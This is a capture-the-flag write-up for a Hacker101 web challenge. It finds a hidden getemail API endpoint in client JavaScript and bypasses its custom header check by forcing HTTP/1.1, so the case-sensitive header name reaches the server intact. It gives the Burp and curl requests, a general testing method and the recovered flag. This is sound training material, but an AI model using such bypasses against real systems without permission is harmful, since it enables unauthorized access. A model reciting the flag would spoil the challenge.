# Hacker101 CTF — getemail API & HTTP/2 Header Case Bypass

## Overview

This challenge involved discovering an undocumented API endpoint that returned email information. The endpoint required a custom security header:

```http
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
```

The main challenge was that the application incorrectly handled HTTP header casing. HTTP/2 normalizes header names to lowercase, while the server-side validation expected the custom header in a specific uppercase form.

By forcing the request to use HTTP/1.1 and sending the required header with the expected casing, the API returned the flag.

---

## Target

```text
https://c680e7770752a4a999715045c067dd32.ctf.hacker101.com
```

---

# Methodology

The overall methodology was:

```text
Source Code Analysis
        ↓
Identify API Endpoint
        ↓
Understand Required Security Header
        ↓
Test API Request
        ↓
Analyze Failed Request
        ↓
Identify HTTP/2 Header Normalization
        ↓
Force HTTP/1.1
        ↓
Send Exact Header Casing
        ↓
Retrieve Flag
```

---

# 1. Source Code Analysis

The first step was examining the website's JavaScript source code.

While inspecting `custom.js`, an interesting API endpoint was identified:

```text
/api/action.php?act=getemail
```

The endpoint appeared to be responsible for retrieving email information.

This was an important discovery because undocumented API endpoints can sometimes expose functionality that is not directly accessible through the application's normal interface.

---

# 2. Identifying the Security Header

Further analysis showed that the API expected a custom HTTP header:

```http
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
```

The value was:

```text
enNlYW5vb2Zjb3Vyc2U=
```

Therefore, the request needed to contain the custom header before the API would process the request correctly.

---

# 3. Initial Request Testing

The endpoint was initially tested using Burp Suite.

An example request looked like:

```http
GET /api/action.php?act=getemail HTTP/2
Host: c680e7770752a4a999715045c067dd32.ctf.hacker101.com
X-Safeprotection: enNlYW5vb2Zjb3Vyc2U=
```

The server responded with:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 0
```

Although the HTTP status was `200 OK`, the response body was empty.

This showed that simply receiving an HTTP 200 response did not necessarily mean that the API operation had succeeded.

---

# 4. Investigating Header Casing

The important difference was noticed in the custom header.

Expected:

```http
X-SAFEPROTECTION
```

Actual request:

```http
X-Safeprotection
```

Normally, HTTP header names are case-insensitive.

For example, these should normally represent the same header:

```text
X-SAFEPROTECTION
x-safeprotection
X-Safeprotection
```

However, the application's behavior suggested that its server-side validation was incorrectly dependent on the exact casing.

---

# 5. Understanding the HTTP/2 Problem

HTTP/2 requires header names to be lowercase.

Conceptually:

```text
X-SAFEPROTECTION
        ↓
      HTTP/2
        ↓
x-safeprotection
```

This is normally not a problem because HTTP header names are supposed to be case-insensitive.

However, the challenge application appeared to perform an incorrect case-sensitive check.

Conceptually, the vulnerable logic behaved like:

```python
if header_name == "X-SAFEPROTECTION":
    allow_request()
else:
    reject_request()
```

Therefore:

```text
X-SAFEPROTECTION
        ↓
      accepted
```

while:

```text
x-safeprotection
        ↓
      rejected
```

This created a mismatch between HTTP protocol behavior and the application's validation logic.

---

# 6. HTTP/1.1 Testing

To avoid HTTP/2 header-name normalization, the request was forced to use HTTP/1.1.

In Burp Suite Repeater, the protocol was changed through the request's protocol settings.

The final request was:

```http
GET /api/action.php?act=getemail HTTP/1.1
Host: c680e7770752a4a999715045c067dd32.ctf.hacker101.com
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
Cookie: welcome=1; cui=a1hteTFwV1gxbUtUWHk2MzRhbWF2QT09
```

The important changes were:

```text
HTTP/2
   ↓
HTTP/1.1
```

and:

```text
X-Safeprotection
   ↓
X-SAFEPROTECTION
```

---

# 7. cURL Method

The same concept can be tested with cURL by explicitly forcing HTTP/1.1:

```bash
curl --http1.1 \
-H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=" \
"https://c680e7770752a4a999715045c067dd32.ctf.hacker101.com/api/action.php?act=getemail"
```

### Command Breakdown

#### `curl`

Used to send an HTTP request from the command line.

#### `--http1.1`

Forces cURL to use HTTP/1.1 instead of HTTP/2.

#### `-H`

Adds a custom HTTP header.

```bash
-H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U="
```

#### URL

The target API endpoint:

```text
/api/action.php?act=getemail
```

---

# 8. Flag Retrieval

After sending the request using the correct protocol and header casing, the API returned:

```text
^FLAG^d24bb283ffa2fbdfcb3ffc2193996ae9d0d8a7ad6dd28c08e0bf4871cbfef2de$
```

The important flag value was:

```text
d24bb283ffa2fbdfcb3ffc2193996ae9d0d8a7ad6dd28c08e0bf4871cbfef2de
```

If Hacker101's submission system rejects the displayed representation, submit the flag using the platform's expected flag format rather than modifying the hash itself.

---

# 9. Why the Technique Worked

The key issue was not that HTTP/2 itself was insecure.

The actual problem was the combination of:

```text
HTTP/2 header normalization
          +
Incorrect server-side case-sensitive validation
```

Normally:

```text
X-SAFEPROTECTION
x-safeprotection
X-Safeprotection
```

should all be treated as the same HTTP header.

But the vulnerable application effectively treated them differently.

Therefore:

```text
HTTP/2
  ↓
Header normalized to lowercase
  ↓
Server expects exact uppercase form
  ↓
Security check fails
```

Using HTTP/1.1 allowed the required header representation to reach the server in the expected form.

---

# 10. Burp Suite Methodology

The practical Burp methodology used in this challenge was:

### Step 1 — Find the endpoint

Inspect JavaScript files such as:

```text
custom.js
```

Search for:

```text
/api/
/action.php
getemail
```

### Step 2 — Identify required headers

Look for custom headers or authentication-related values.

In this case:

```http
X-SAFEPROTECTION
```

### Step 3 — Send the request to Repeater

Use:

```text
Right Click → Send to Repeater
```

### Step 4 — Observe the protocol

The initial request was using:

```text
HTTP/2
```

### Step 5 — Check header casing

The request contained:

```http
X-Safeprotection
```

instead of:

```http
X-SAFEPROTECTION
```

### Step 6 — Force HTTP/1.1

In Repeater:

```text
Inspector
    ↓
Request Attributes
    ↓
Protocol
    ↓
HTTP/1.1
```

### Step 7 — Send the exact header

```http
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
```

### Step 8 — Analyze the response

Don't rely only on:

```text
HTTP 200 OK
```

Check:

* Response body
* Content-Length
* Returned data
* Cookies
* Redirects
* Server behavior

### Step 9 — Extract the flag

The API returned the flag after the request was correctly constructed.

---

# 11. Key Lessons Learned

## Source Code Reconnaissance

JavaScript files can reveal:

* Hidden API endpoints
* API parameters
* Internal functionality
* Custom headers
* Authentication mechanisms

Always inspect client-side JavaScript during web application testing.

---

## HTTP Header Behavior

HTTP header names are normally case-insensitive.

For example:

```text
Authorization
authorization
AUTHORIZATION
```

should represent the same header name.

If an application treats them differently, it may indicate incorrect server-side validation.

---

## HTTP/2 vs HTTP/1.1

A useful mental model:

```text
HTTP/2
  ↓
Header names are lowercase
  ↓
Potential problem with broken case-sensitive validation
```

Whereas:

```text
HTTP/1.1
  ↓
Does not impose HTTP/2's lowercase header-name requirement
  ↓
Can be useful for testing header-casing behavior
```

---

# 12. General Testing Methodology for Similar Bugs

When encountering a custom security header during authorized testing:

```text
1. Find the endpoint
       ↓
2. Identify required headers
       ↓
3. Send a normal request
       ↓
4. Compare expected vs actual headers
       ↓
5. Check HTTP version
       ↓
6. Test HTTP/1.1 vs HTTP/2
       ↓
7. Observe header normalization
       ↓
8. Test whether server validation is case-sensitive
       ↓
9. Compare responses
       ↓
10. Document the behavior
```

The goal is not simply to change random headers.

The goal is to understand:

> **What does the client send → what actually reaches the server → how does the server validate it?**

---

# 13. Final Takeaway

The challenge demonstrated how a seemingly small implementation mistake can affect an application's security controls.

The important chain was:

```text
JavaScript Analysis
        ↓
Hidden API Endpoint
        ↓
Custom Security Header
        ↓
HTTP/2 Normalization
        ↓
Case-Sensitive Server Validation
        ↓
HTTP/1.1
        ↓
Correct Header Casing
        ↓
API Response
        ↓
Flag
```

The biggest lesson from this challenge is:

> **Always investigate the difference between what you send, what the protocol transmits, and what the server actually validates.**

This is especially useful when testing applications that use custom authentication or security headers.
